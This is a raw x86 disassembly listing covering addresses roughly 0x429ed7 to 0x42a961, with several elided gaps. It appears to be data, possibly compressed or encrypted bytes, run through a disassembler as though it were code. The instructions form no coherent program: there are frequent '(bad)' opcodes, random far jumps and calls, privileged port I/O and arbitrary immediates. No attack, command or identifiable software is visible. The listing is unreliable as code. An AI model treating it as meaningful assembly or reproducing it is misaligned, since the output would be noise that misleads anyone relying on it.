  429ed7:	add    al,BYTE PTR [esi+0x16]
  429eda:	lods   eax,DWORD PTR ds:[esi]
  429edb:	mov    ch,0xb3
  429edd:	xchg   edx,eax
  429ede:	icebp  
  429edf:	test   edx,0x6b50f64f
  429ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ee6:	les    ebp,FWORD PTR [ebp-0x53]
  429ee9:	ja     0x429ea8
  429eeb:	jmp    0x9591:0xf1e4df17
  429ef2:	and    DWORD PTR [eax-0x35],esi
  429ef5:	xor    al,BYTE PTR [edx+0x68]
  429ef8:	mov    ds:0x86939ae3,eax
  429efd:	dec    eax
  429efe:	xchg   esi,eax
  429eff:	inc    eax
  429f00:	xor    eax,0x573d0706
  429f05:	xlat   BYTE PTR ds:[ebx]
  429f06:	sub    ch,al
  429f08:	fnstenv [ecx+0x77a0288b]
  429f0e:	jl     0x429f10
  429f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429f11:	add    bh,BYTE PTR [ebp-0x3b5f10c]
  429f17:	test   ah,bh
  429f19:	ds add ecx,ecx
  429f1c:	lods   al,BYTE PTR ds:[esi]
  429f1d:	dec    eax
  429f1e:	sbb    eax,0xe50d62a8
  429f23:	mov    dh,0x37
  429f25:	mov    ds:0x3b4af922,eax
  429f2a:	sti    
  429f2b:	sub    edi,DWORD PTR [edx-0x753af92b]
  429f31:	mov    cl,0xe1
  429f33:	mov    ebx,0x76152864
  429f38:	sub    al,dh
  429f3a:	ret    0x9a11
  429f3d:	cmp    eax,DWORD PTR [eiz*4+0x9fec]
	...
  429fb4:	loope  0x429fa2
  429fb6:	mov    ebx,es
  429fb8:	(bad)  
  429fb9:	jecxz  0x429faa
  429fbb:	out    dx,al
  429fbc:	sub    dh,BYTE PTR [eax+0x72546d7b]
  429fc2:	cwde   
  429fc3:	push   esp
  429fc4:	ret    0x1bd
  429fc7:	add    dh,dh
  429fc9:	add    BYTE PTR [eax],al
  429fcb:	add    BYTE PTR [ebp+0x30],bh
  429fce:	pop    esi
  429fcf:	push   es
  429fd0:	fs fcom st(2)
  429fd3:	jns    0x429fa2
  429fd5:	jno    0x42a01b
  429fd7:	ss aad 0xa3
  429fda:	outs   dx,DWORD PTR ds:[esi]
  429fdb:	mov    BYTE PTR [ecx+ebp*1+0x7c],bl
  429fdf:	in     al,dx
  429fe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429fe1:	push   esi
  429fe2:	pop    ecx
  429fe3:	fs scas eax,DWORD PTR es:[edi]
  429fe5:	test   eax,0xc4d1f617
  429fea:	pop    ecx
  429feb:	ror    DWORD PTR [esi-0x15605670],cl
  429ff1:	jne    0x429f88
  429ff3:	sbb    dh,BYTE PTR [edi-0xcaeb02d]
  429ff9:	push   cs
  429ffa:	rol    al,1
  429ffc:	add    DWORD PTR ds:0xcf146083,0xc9b53d85
  42a006:	xchg   edx,eax
  42a007:	sub    ah,bh
  42a009:	cmc    
  42a00a:	icebp  
  42a00b:	or     edi,esi
  42a00d:	sbb    eax,0xbb3a3de9
  42a012:	pop    esp
  42a013:	inc    esp
  42a014:	inc    ecx
  42a015:	or     al,0xdc
  42a017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a018:	or     esi,ebp
  42a01a:	xchg   BYTE PTR [edx+0x43],ch
  42a01d:	imul   BYTE PTR [edx-0x61ea0521]
  42a023:	add    al,0xfd
  42a025:	inc    BYTE PTR [esi-0x7e59f548]
  42a02b:	jmp    0x429ff0
  42a02d:	sbb    eax,0xbfbac320
  42a032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a033:	jb     0x42a000
  42a035:	fwait
  42a036:	inc    eax
  42a037:	enter  0xf5b0,0xdc
  42a03b:	bound  eax,QWORD PTR [ebx+ecx*1-0x1c]
  42a03f:	sub    ch,BYTE PTR [edx]
  42a041:	push   cs
  42a042:	retf   0x7205
  42a045:	fisub  DWORD PTR ds:0x45dbc0e0
  42a04b:	stos   DWORD PTR es:[edi],eax
  42a04c:	jecxz  0x42a06b
  42a04e:	hlt    
  42a04f:	add    BYTE PTR [ebp+0x68b2ae11],al
  42a055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a056:	inc    edi
  42a057:	(bad)  
  42a058:	(bad)  [ecx-0x19]
  42a05b:	xlat   BYTE PTR ds:[ebx]
  42a05c:	jmp    0xd3725222
  42a061:	dec    edx
  42a062:	and    al,bl
  42a064:	fild   DWORD PTR ds:0xdb51bfc4
  42a06a:	jmp    0x877b:0x809f375d
  42a071:	sbb    DWORD PTR [ebx+0x5e77092],0x4e3c3e88
  42a07b:	lds    edi,FWORD PTR [eax]
  42a07d:	aas    
  42a07e:	cli    
  42a07f:	rcl    BYTE PTR [edx],cl
  42a081:	leave  
  42a082:	mov    ebp,0xbac0bb
  42a087:	je     0x42a0a1
  42a089:	out    dx,eax
  42a08a:	sub    eax,0x60344a0a
  42a08f:	jecxz  0x42a10f
  42a091:	add    eax,0x9ad7f27b
  42a096:	daa    
  42a097:	xchg   esp,eax
  42a098:	adc    esp,DWORD PTR [ebp+0x4503618b]
  42a09e:	and    eax,0xfe1c39eb
  42a0a3:	jle    0x42a0f1
  42a0a5:	mov    WORD PTR [edx+0x37],es
  42a0a8:	adc    bl,ah
  42a0aa:	(bad)  
  42a0ab:	jb     0x42a0c4
  42a0ad:	ficomp DWORD PTR ds:[eax+0x22]
  42a0b1:	hlt    
  42a0b2:	sub    esp,DWORD PTR ds:0x8f9daa87
  42a0b8:	adc    eax,0x382876ae
  42a0bd:	inc    ebx
  42a0be:	pusha  
  42a0bf:	ret    0x320c
	...
  42a132:	add    BYTE PTR [eax],al
  42a134:	push   esi
  42a135:	xchg   ebp,edi
  42a137:	test   ch,bh
  42a139:	(bad)  
  42a13a:	jg     0x42a113
  42a13c:	jbe    0x42a105
  42a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13f:	(bad)  
  42a140:	rol    BYTE PTR [edx+0x17],0x14
  42a144:	mov    eax,0xf60001be
  42a149:	add    BYTE PTR [eax],al
  42a14b:	add    BYTE PTR [edi-0x28],ah
  42a14e:	pop    ecx
  42a14f:	jp     0x42a159
  42a151:	cld    
  42a152:	adc    DWORD PTR [esi-0x9],0xfffffffd
  42a156:	cs pop esi
  42a158:	shr    ebx,cl
  42a15a:	outs   dx,BYTE PTR ds:[esi]
  42a15b:	sbb    eax,0x9be3e11c
  42a160:	pop    ecx
  42a161:	mov    esp,0x58812996
  42a166:	fnsave [esi-0x7cbb1109]
  42a16c:	push   cs
  42a16d:	pop    ss
  42a16e:	arpl   dx,si
  42a170:	mov    al,0x37
  42a172:	(bad)  
  42a174:	(bad)  
  42a175:	int    0x4c
  42a177:	call   0xa614678c
  42a17c:	outs   dx,DWORD PTR ds:[esi]
  42a17d:	inc    esp
  42a17e:	mov    BYTE PTR [edx+0x2b],0x16
  42a182:	mov    ch,0x6a
  42a184:	je     0x42a181
  42a186:	repz jo 0x42a168
  42a189:	xchg   esi,eax
  42a18a:	xchg   edi,eax
  42a18b:	xchg   edx,eax
  42a18c:	ret    
  42a18d:	add    edx,0x35
  42a190:	mov    ah,al
  42a192:	repz pop edx
  42a194:	iret   
  42a195:	jmp    0x1429:0x52f4be3
  42a19c:	stos   DWORD PTR es:[edi],eax
  42a19d:	imul   ebp,DWORD PTR [edx+0x6f456254],0xffffffa2
  42a1a4:	push   ebp
  42a1a5:	retf   
  42a1a6:	push   ebx
  42a1a7:	loopne 0x42a1b8
  42a1a9:	and    BYTE PTR [eax-0x2d8e7a50],cl
  42a1af:	mov    al,0xba
  42a1b1:	jmp    0xafe237a0
  42a1b6:	es adc al,0x28
  42a1b9:	mov    DWORD PTR [ebx+0x22],edi
  42a1bc:	xor    DWORD PTR [edi+ecx*1-0x55],eax
  42a1c0:	cli    
  42a1c1:	out    0x5e,al
  42a1c3:	sbb    esi,DWORD PTR [esi]
  42a1c5:	(bad)  
  42a1c6:	idiv   DWORD PTR [edi*2+0x1ea445a9]
  42a1cd:	dec    eax
  42a1ce:	xchg   ebp,eax
  42a1cf:	imul   ebx,DWORD PTR [edx],0xffffff87
  42a1d2:	dec    ebp
  42a1d3:	fild   QWORD PTR [ecx+ebx*1+0x5bfebede]
  42a1da:	dec    edi
  42a1db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a1dc:	lahf   
  42a1dd:	adc    eax,0x4ea53e50
  42a1e2:	add    al,0x6e
  42a1e4:	sbb    bh,BYTE PTR [edi+0x6ea8fd53]
  42a1ea:	(bad)  
  42a1eb:	dec    edx
  42a1ec:	push   ss
  42a1ed:	pop    edx
  42a1ee:	pop    eax
  42a1ef:	add    al,0xc8
  42a1f1:	stc    
  42a1f2:	sbb    DWORD PTR [esi+0x1a2d5393],edx
  42a1f8:	xchg   ecx,eax
  42a1f9:	(bad)  
  42a1fa:	mov    ebp,0x6935ed82
  42a1ff:	jae    0x42a211
  42a201:	and    ch,BYTE PTR cs:[esi+0x25]
  42a205:	push   0x35
  42a207:	fwait
  42a208:	mov    ds:0x77d39534,al
  42a20d:	xor    eax,0xae7e4e66
  42a212:	sub    BYTE PTR [ecx+ecx*2-0x81d1f3a],ah
  42a219:	outs   dx,DWORD PTR ds:[esi]
  42a21a:	cmp    al,BYTE PTR [ebp+esi*2+0x2d]
  42a21e:	icebp  
  42a21f:	and    ch,BYTE PTR [eax-0x5bc2f23e]
  42a225:	pop    edi
  42a226:	imul   edi,esp,0x73
  42a229:	push   eax
  42a22a:	icebp  
  42a22b:	neg    DWORD PTR [edx-0xf]
  42a22e:	nop
  42a22f:	aaa    
  42a230:	push   ss
  42a231:	push   0x5b
  42a233:	xor    eax,0x273e331e
  42a238:	mov    al,ds:0x78e8bf8d
  42a23d:	or     al,0xd4
  42a23f:	out    0x6,eax
  42a241:	push   ecx
	...
  42a2b2:	add    BYTE PTR [eax],al
  42a2b4:	lock adc al,0xe1
  42a2b7:	(bad)  
  42a2b8:	in     eax,0xff
  42a2ba:	call   FWORD PTR [esi]
  42a2bc:	xor    eax,0xcc7f8ab9
  42a2c1:	dec    ebx
  42a2c2:	jge    0x42a2fe
  42a2c4:	scas   al,BYTE PTR es:[edi]
  42a2c5:	mov    edi,0xf60001
  42a2ca:	add    BYTE PTR [eax],al
  42a2cc:	mov    ebx,0xff6d2c48
  42a2d1:	shld   DWORD PTR [ecx-0x77],ebx,0xcf
  42a2d6:	jp     0x42a275
  42a2d8:	lods   eax,DWORD PTR ds:[esi]
  42a2d9:	or     BYTE PTR [eax-0x57],bh
  42a2dc:	mov    bh,BYTE PTR [ecx-0x2f]
  42a2df:	pop    ebp
  42a2e0:	icebp  
  42a2e1:	nop
  42a2e2:	xchg   edi,eax
  42a2e4:	jo     0x42a287
  42a2e6:	ja     0x42a298
  42a2e8:	and    eax,0x9d6d79df
  42a2ed:	adc    eax,0xcb37fd8e
  42a2f2:	cmp    DWORD PTR [esi+0x3d],eax
  42a2f5:	gs push edi
  42a2f7:	sub    eax,0x99010705
  42a2fc:	jl     0x42a2d2
  42a2fe:	hlt    
  42a2ff:	cs loope 0x42a327
  42a302:	in     eax,dx
  42a303:	pop    ebp
  42a304:	loopne 0x42a2d4
  42a306:	sbb    al,0xe8
  42a308:	mov    ds:0x1617b2a3,al
  42a30d:	adc    edi,esp
  42a30f:	sub    ecx,ecx
  42a311:	push   eax
  42a312:	jnp    0x42a37b
  42a314:	pusha  
  42a315:	xor    BYTE PTR cs:[esi+edx*8-0x3baeec19],bl
  42a31d:	scas   al,BYTE PTR es:[edi]
  42a31e:	jb     0x42a2cd
  42a320:	push   ecx
  42a321:	inc    esp
  42a322:	dec    ebp
  42a323:	shl    BYTE PTR [eax-0x6e],1
  42a326:	outs   dx,BYTE PTR ds:[esi]
  42a327:	daa    
  42a328:	mov    eax,0xe2f7ef93
  42a32d:	dec    esp
  42a32e:	lahf   
  42a32f:	pop    ebp
  42a330:	imul   ebp,DWORD PTR [eax+0x432efe93],0x2b2bb4a6
  42a33a:	stos   DWORD PTR es:[edi],eax
  42a33b:	or     BYTE PTR [edx+edx*8-0x342c0ec0],cl
  42a342:	or     ecx,DWORD PTR [esi-0x34e56083]
  42a348:	pop    edi
  42a349:	mov    ds:0x9ade7eb2,eax
  42a34e:	leave  
  42a34f:	adc    DWORD PTR [ebx+0x205d9f5a],esi
  42a355:	iret   
  42a356:	jmp    0x42a39e
  42a358:	inc    ebx
  42a359:	xchg   edx,eax
  42a35a:	jmp    0x9e5d30aa
  42a35f:	call   0x91e:0x7a98a61d
  42a366:	and    al,0xff
  42a368:	xchg   ebx,eax
  42a369:	jg     0x42a347
  42a36b:	shl    ah,1
  42a36d:	adc    al,0xa4
  42a36f:	sti    
  42a370:	loop   0x42a2fa
  42a372:	mov    bl,0x50
  42a374:	dec    ebp
  42a375:	(bad)  
  42a376:	in     al,dx
  42a377:	mov    DWORD PTR [ecx+0x11],eax
  42a37a:	jmp    0xe403:0xa8277567
  42a381:	stc    
  42a382:	inc    esi
  42a383:	xor    al,0xdb
  42a385:	enter  0x6c78,0x5a
  42a389:	and    eax,0x80505f5e
  42a38e:	setle  BYTE PTR [ebx]
  42a391:	stos   DWORD PTR es:[edi],eax
  42a392:	dec    edx
  42a393:	or     al,0xb0
  42a395:	dec    edi
  42a396:	test   BYTE PTR [edi],ch
  42a398:	cmp    esp,DWORD PTR [ebx-0x1d]
  42a39b:	mov    ds:0x9e37c7a6,al
  42a3a0:	add    DWORD PTR [ebx*2-0xb327f4d],edi
  42a3a7:	inc    ebp
  42a3a8:	dec    eax
  42a3a9:	pushf  
  42a3aa:	adc    al,0x84
  42a3ac:	out    0x4c,eax
  42a3ae:	mov    BYTE PTR [ebp-0x3a],dl
  42a3b1:	jnp    0x42a388
  42a3b3:	mov    DWORD PTR [esp+esi*8-0x6586dfc],ebx
  42a3ba:	std    
  42a3bb:	(bad)  
  42a3bc:	sub    edi,DWORD PTR ds:0x4d67271
	...
  42a432:	add    BYTE PTR [eax],al
  42a434:	dec    esp
  42a435:	or     eax,0x3e532c13
  42a43a:	jg     0x42a4a9
  42a43c:	stos   BYTE PTR es:[edi],al
  42a43d:	dec    ebx
  42a43e:	push   edi
  42a43f:	jo     0x42a418
  42a441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a442:	sbb    ebp,DWORD PTR ds:0x1c0a4
  42a448:	test   BYTE PTR [eax],0x0
  42a44b:	add    BYTE PTR [edi-0x356307db],dh
  42a451:	lods   al,BYTE PTR ds:[esi]
  42a452:	mov    esi,0xda89143e
  42a457:	call   0x1f90:0x38a795b1
  42a45e:	pop    edi
  42a45f:	push   0xffffffbe
  42a461:	fmul   QWORD PTR [ebx-0xa]
  42a464:	mov    esi,0x1f693f76
  42a469:	rcl    DWORD PTR [esi+esi*4-0xf],1
  42a46d:	fdiv   QWORD PTR [ecx+ebp*1+0x779f4d3b]
  42a474:	xchg   ecx,eax
  42a475:	call   0x7033:0x8e976aaa
  42a47c:	pop    edx
  42a47d:	inc    edi
  42a47e:	dec    esp
  42a47f:	inc    ebp
  42a480:	in     eax,0xd6
  42a482:	sahf   
  42a483:	xor    bl,BYTE PTR [esi+0x470f1be6]
  42a489:	stos   DWORD PTR es:[edi],eax
  42a48a:	mov    ebx,0xe6505770
  42a48f:	pop    edx
  42a490:	daa    
  42a491:	push   es
  42a492:	out    0xdc,al
  42a494:	jge    0x42a4ab
  42a496:	in     eax,dx
  42a497:	imul   esp,esi,0x46
  42a49a:	adc    al,BYTE PTR [ebp+0x607a53fb]
  42a4a0:	mov    ds:0x49a2430,al
  42a4a5:	pop    esp
  42a4a6:	arpl   WORD PTR [ecx],si
  42a4a8:	add    ebx,DWORD PTR [esp+eax*2]
  42a4ab:	xor    ch,bh
  42a4ad:	in     eax,0x83
  42a4af:	lods   al,BYTE PTR ds:[esi]
  42a4b0:	or     al,0xf9
  42a4b2:	push   edi
  42a4b3:	jae    0x42a455
  42a4b5:	push   ebp
  42a4b6:	repz repnz cmp ecx,DWORD PTR [ecx+edx*8]
  42a4bb:	leave  
  42a4bc:	sbb    al,0x1b
  42a4be:	adc    DWORD PTR [edx-0x6c57dba1],0x1b
  42a4c5:	ss and al,0x7e
  42a4c8:	addr16 inc edx
  42a4ca:	ret    0xfb46
  42a4cd:	(bad)  
  42a4ce:	daa    
  42a4cf:	cs popw ds
  42a4d2:	int    0x77
  42a4d4:	loopne 0x42a4fb
  42a4d6:	gs xchg edi,eax
  42a4d8:	inc    edi
  42a4d9:	push   esi
  42a4da:	or     BYTE PTR [edi+0x7d],al
  42a4dd:	clc    
  42a4de:	neg    BYTE PTR [esi-0x681941c4]
  42a4e4:	mov    esi,0xaa977704
  42a4e9:	pop    ebx
  42a4ea:	or     BYTE PTR [ebx+0x11],al
  42a4ed:	push   esi
  42a4ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a4ef:	out    dx,eax
  42a4f0:	stos   BYTE PTR es:[edi],al
  42a4f1:	push   edi
  42a4f2:	pop    ebx
  42a4f3:	pusha  
  42a4f4:	mov    eax,0x83b9b681
  42a4f9:	cs in  al,dx
  42a4fb:	or     dl,BYTE PTR [ebx-0x63]
  42a4fe:	mov    edi,0xd53771f0
  42a503:	xchg   esi,eax
  42a504:	dec    esi
  42a505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a506:	add    ah,bh
  42a508:	fmul   DWORD PTR [eax-0x77]
  42a50b:	or     DWORD PTR [ecx],edi
  42a50d:	sub    al,0xa
  42a50f:	add    DWORD PTR [ecx-0x78],0xffffff84
  42a513:	jmp    0x4e54:0xb2e5ded4
  42a51a:	jnp    0x42a53c
  42a51c:	add    eax,0xc31e7b7f
  42a521:	scas   al,BYTE PTR es:[edi]
  42a522:	int3   
  42a523:	cmp    al,0x13
  42a525:	ret    0x4e1c
  42a528:	push   esp
  42a529:	add    edi,DWORD PTR [esi+0x43e5eb1b]
  42a52f:	sbb    esi,ebx
  42a531:	scas   al,BYTE PTR es:[edi]
  42a532:	rcl    ebp,cl
  42a534:	or     BYTE PTR [edi+ecx*2],cl
  42a537:	clc    
  42a538:	imul   ecx,DWORD PTR [ecx],0x237acfea
  42a53e:	jmp    0x42a562
  42a540:	ror    DWORD PTR [eax+0x0],0x0
	...
  42a5b3:	add    BYTE PTR [ebp+0x1d],ch
  42a5b6:	out    0xc0,al
  42a5b8:	idiv   bl
  42a5ba:	outs   dx,DWORD PTR ds:[esi]
  42a5bb:	mov    ebp,0x44d94d2c
  42a5c0:	retf   
  42a5c1:	inc    edi
  42a5c2:	cdq    
  42a5c3:	mov    al,0x9a
  42a5c5:	rol    DWORD PTR [ecx],0x0
  42a5c8:	test   BYTE PTR [eax],0x0
  42a5cb:	add    BYTE PTR [ebp-0xf],dl
  42a5ce:	fist   WORD PTR [esi-0x409323b]
  42a5d4:	ins    DWORD PTR es:[edi],dx
  42a5d5:	test   al,0xf9
  42a5d7:	inc    ebp
  42a5d8:	jno    0x42a5ce
  42a5da:	out    0x47,eax
  42a5dc:	leave  
  42a5dd:	xor    DWORD PTR [edi],edx
  42a5df:	into   
  42a5e0:	xor    DWORD PTR [eax+esi*1],esi
  42a5e3:	add    al,0x11
  42a5e5:	push   edx
  42a5e6:	stos   DWORD PTR es:[edi],eax
  42a5e7:	mov    ebp,0x2706e742
  42a5ec:	pop    edi
  42a5ed:	and    BYTE PTR [edx-0x28],0xea
  42a5f1:	imul   eax,DWORD PTR [ebx-0x4f],0x513281d
  42a5f8:	jno    0x42a622
  42a5fa:	mov    ss,WORD PTR [ecx-0x72ee9053]
  42a600:	jo     0x42a639
  42a602:	and    bh,dl
  42a604:	imul   edx,DWORD PTR [ebp+0x47],0xffffffec
  42a608:	rcl    BYTE PTR [edi+0x5e],0xe
  42a60c:	stc    
  42a60d:	push   edx
  42a60e:	inc    ebx
  42a60f:	sub    ah,BYTE PTR [eax]
  42a611:	in     eax,dx
  42a612:	xor    BYTE PTR [eax+0x51],ch
  42a615:	mov    ecx,0xb21d4add
  42a61a:	sub    eax,0xa0be3ffd
  42a61f:	xchg   ecx,eax
  42a620:	and    BYTE PTR [ebp-0x2d],bh
  42a623:	call   0x8677:0x4e0381cc
  42a62a:	and    cl,BYTE PTR [eax]
  42a62c:	mov    bl,0x79
  42a62e:	(bad)  
  42a62f:	push   0x8054e064
  42a634:	lea    edx,[edi]
  42a636:	daa    
  42a637:	mov    esi,0x165cbc2f
  42a63c:	int    0x88
  42a63e:	pop    ecx
  42a63f:	(bad)  
  42a640:	add    DWORD PTR es:[esi-0x48b1ba33],ebp
  42a647:	adc    eax,ecx
  42a649:	and    al,0x54
  42a64b:	call   0xc330b34c
  42a650:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a652:	mov    ?,WORD PTR [ecx+0xa310834]
  42a658:	xor    DWORD PTR [ebp+eax*2+0x3d],ebp
  42a65c:	adc    eax,0x5db820e3
  42a661:	sub    BYTE PTR [ebp+0x5bea593c],dh
  42a667:	mov    esp,0x11e99a0d
  42a66c:	fidivr WORD PTR [esi]
  42a66e:	mov    ebx,0xa03b91f7
  42a673:	mov    dh,0x5f
  42a675:	repz sahf 
  42a677:	push   edx
  42a678:	jp     0x42a6b8
  42a67a:	clc    
  42a67b:	xchg   ebp,eax
  42a67c:	cli    
  42a67d:	add    eax,0xee75a201
  42a682:	stc    
  42a683:	mov    ebx,0xe30a9053
  42a688:	popa   
  42a689:	cld    
  42a68a:	pop    esi
  42a68b:	stc    
  42a68c:	in     eax,0x1f
  42a68e:	call   DWORD PTR [ebx+0x6f]
  42a691:	xchg   BYTE PTR [ebx],dl
  42a693:	jecxz  0x42a677
  42a695:	idiv   BYTE PTR [edi+0x69]
  42a698:	leave  
  42a699:	mov    al,ds:0x51791209
  42a69e:	xchg   ecx,eax
  42a69f:	jno    0x42a685
  42a6a1:	out    dx,eax
  42a6a2:	das    
  42a6a3:	leave  
  42a6a4:	inc    edx
  42a6a5:	gs imul ecx,ecx,0x0
  42a6a9:	mov    ch,0xdd
  42a6ab:	dec    edx
  42a6ac:	adc    al,0xb
  42a6ae:	push   0x17
  42a6b0:	dec    esi
  42a6b1:	(bad)  
  42a6b2:	add    eax,0x99ce4a6
  42a6b7:	(bad)  
  42a6b8:	lods   al,BYTE PTR ds:[esi]
  42a6b9:	imul   bh
  42a6bb:	pop    edi
  42a6bc:	outs   dx,BYTE PTR ds:[esi]
  42a6bd:	sbb    BYTE PTR [eax-0x6c],ah
  42a6c0:	sub    esi,ecx
	...
  42a732:	add    BYTE PTR [eax],al
  42a734:	xor    BYTE PTR [edx-0x21],al
  42a737:	(bad)  
  42a738:	(bad)  
  42a739:	(bad)  
  42a73a:	mov    ebp,0xffb84452
  42a73f:	cdq    
  42a740:	out    dx,al
  42a741:	mov    ebx,0xc290ea5a
  42a746:	add    DWORD PTR [eax],eax
  42a748:	test   BYTE PTR [eax],0x0
  42a74b:	add    BYTE PTR [esi*4+0x60e4abea],dh
  42a752:	jg     0x42a6f8
  42a754:	pop    ds
  42a755:	pop    ebx
  42a756:	int3   
  42a757:	sbb    esi,DWORD PTR [eax]
  42a759:	js     0x42a7c1
  42a75b:	add    ebp,DWORD PTR [eax-0x73]
  42a75e:	popf   
  42a75f:	data16 in al,dx
  42a761:	inc    ebx
  42a762:	pop    edi
  42a763:	xlat   BYTE PTR ds:[ebx]
  42a764:	mov    bl,BYTE PTR [ebp-0x4a]
  42a767:	adc    bh,bh
  42a769:	inc    edx
  42a76a:	daa    
  42a76b:	xor    DWORD PTR [edx],ebx
  42a76d:	xchg   DWORD PTR [ebp-0x73],edx
  42a770:	call   0xb3b01a1
  42a775:	sbb    DWORD PTR [edi-0x3e],esp
  42a778:	leave  
  42a779:	aaa    
  42a77a:	imul   ecx,esp,0x5a
  42a77d:	mov    al,ds:0xedd921e0
  42a782:	cs xchg ecx,eax
  42a784:	mov    al,0xd0
  42a786:	fstp   TBYTE PTR [edi]
  42a788:	(bad)  
  42a789:	sahf   
  42a78a:	pop    es
  42a78b:	test   al,0xb3
  42a78d:	xlat   BYTE PTR ds:[ebx]
  42a78e:	lock shl BYTE PTR [ebp+0xd],1
  42a792:	cli    
  42a793:	test   BYTE PTR [esi+0x2b21b984],cl
  42a799:	(bad)
  42a79d:	pop    ebp
  42a79e:	add    BYTE PTR [edx+0x1451cd1c],0x32
  42a7a5:	xchg   ecx,eax
  42a7a6:	xor    eax,DWORD PTR [edi]
  42a7a8:	add    ebp,DWORD PTR [ecx+ebp*1]
  42a7ab:	imul   esi,ebx,0xffffffa2
  42a7ae:	sub    eax,ecx
  42a7b0:	sub    BYTE PTR [eax-0x27],dl
  42a7b3:	(bad)  
  42a7b4:	pushf  
  42a7b5:	add    al,0xe0
  42a7b7:	cmp    DWORD PTR [edi+0x763e7a07],ebx
  42a7bd:	adc    eax,0x7cc611a7
  42a7c2:	loop   0x42a830
  42a7c4:	aas    
  42a7c5:	std    
  42a7c6:	fcmovnbe st,st(3)
  42a7c8:	cmp    al,0x59
  42a7ca:	sub    eax,0xd54f2179
  42a7cf:	inc    esp
  42a7d0:	and    eax,0x39d47c54
  42a7d5:	mov    ebx,0xd13b348d
  42a7da:	je     0x42a7e3
  42a7dc:	cmp    dh,dh
  42a7de:	retf   0x51ca
  42a7e1:	xchg   ebx,eax
  42a7e2:	fld    QWORD PTR [ecx-0x4541b16e]
  42a7e8:	jge    0x42a7c0
  42a7ea:	add    DWORD PTR [edx-0x72d4987c],ebp
  42a7f0:	cmc    
  42a7f1:	xchg   esi,eax
  42a7f2:	dec    ecx
  42a7f3:	xor    ch,BYTE PTR [edx+0x64]
  42a7f6:	sbb    al,0x1d
  42a7f8:	mov    ecx,DWORD PTR [ecx+0x64]
  42a7fb:	mov    ds:0x6f74decc,al
  42a800:	pop    ds
  42a801:	test   BYTE PTR ss:[ebx+0x19],bh
  42a805:	in     al,0x99
  42a807:	push   es
  42a808:	nop
  42a809:	retf   0x95f9
  42a80c:	pushf  
  42a80d:	out    0x27,al
  42a80f:	xchg   ebx,eax
  42a810:	dec    ebp
  42a811:	icebp  
  42a812:	ins    DWORD PTR es:[edi],dx
  42a813:	out    0xcf,eax
  42a815:	rcl    DWORD PTR [edi+ebx*1-0x2],0xe0
  42a81a:	les    esp,FWORD PTR [ebx-0x4f]
  42a81d:	add    BYTE PTR [ebx-0x59],bl
  42a820:	daa    
  42a821:	gs mov dh,0x17
  42a824:	sbb    eax,0x4f3ecba5
  42a829:	test   BYTE PTR [edi+0x63d66bf9],cl
  42a82f:	stos   BYTE PTR es:[edi],al
  42a830:	sub    DWORD PTR [esi-0x66],edx
  42a833:	mov    ecx,0xae9ff024
  42a838:	pop    esi
  42a839:	pop    esi
  42a83a:	pop    es
  42a83b:	add    eax,0xa2d19889
  42a840:	and    DWORD PTR [edi+0x0],esp
	...
  42a8b3:	add    BYTE PTR [edi+0x68],dl
  42a8b6:	fistp  QWORD PTR fs:[edi-0x21]
  42a8ba:	(bad)  
  42a8bb:	call   0x123b0c10
  42a8c0:	std    
  42a8c1:	push   0xc386e22f
  42a8c6:	add    DWORD PTR [eax],eax
  42a8c8:	test   BYTE PTR [eax],0x0
  42a8cb:	add    cl,ah
  42a8cd:	test   al,0x98
  42a8cf:	mov    ah,0x1a
  42a8d1:	dec    esi
  42a8d2:	jecxz  0x42a90e
  42a8d4:	inc    esi
  42a8d5:	push   si
  42a8d7:	into   
  42a8d8:	lock bound esi,QWORD PTR [ecx]
  42a8db:	frstor [eax+0x71]
  42a8de:	call   0x51cd7af3
  42a8e3:	cli    
  42a8e4:	mov    ds:0xefdf8106,eax
  42a8e9:	adc    ch,BYTE PTR [ebx-0x2604c576]
  42a8ef:	add    BYTE PTR ds:[edx],0x58
  42a8f3:	cmp    edx,esp
  42a8f5:	push   edx
  42a8f6:	leave  
  42a8f7:	lea    ebp,[ebx-0x33]
  42a8fa:	jb     0x42a893
  42a8fc:	jo     0x42a8e5
  42a8fe:	lods   al,BYTE PTR ds:[esi]
  42a8ff:	dec    ebx
  42a900:	int    0xef
  42a902:	dec    edi
  42a903:	jae    0x42a972
  42a905:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  42a907:	sbb    al,0xbb
  42a909:	and    al,0x1b
  42a90b:	cli    
  42a90c:	xor    al,0x88
  42a90e:	loopne 0x42a97a
  42a910:	jno    0x42a93a
  42a912:	out    dx,eax
  42a913:	mov    al,0x16
  42a915:	sbb    al,0x8d
  42a917:	outs   dx,DWORD PTR ds:[esi]
  42a918:	pop    ecx
  42a919:	pop    esp
  42a91a:	(bad)  
  42a91b:	push   edi
  42a91c:	sbb    ebp,DWORD PTR [ebx+0x17025e40]
  42a922:	mov    al,0xf3
  42a924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a925:	mov    edi,0xf9b44066
  42a92a:	ret    
  42a92b:	or     eax,0xc8b095cd
  42a930:	jle    0x42a92f
  42a932:	cmp    eax,0xf2a2ca64
  42a937:	les    ebx,FWORD PTR [esi-0x6a]
  42a93a:	int3   
  42a93b:	and    ebx,ebx
  42a93d:	into   
  42a93e:	mov    eax,0x6e468d79
  42a943:	xchg   esp,eax
  42a944:	jnp    0x42a98c
  42a946:	ds mov edi,0xa66208a
  42a94c:	cmp    ch,dl
  42a94e:	clc    
  42a94f:	out    dx,al
  42a950:	daa    
  42a951:	fistp  WORD PTR [esi]
  42a953:	scas   al,BYTE PTR es:[edi]
  42a954:	les    edi,FWORD PTR [edx+0x392b7c2c]
  42a95a:	mov    fs,esp
  42a95c:	inc    esi
  42a95d:	sub    DWORD PTR [ecx+edx*1+0x29],esp
  42a961:	neg    esi
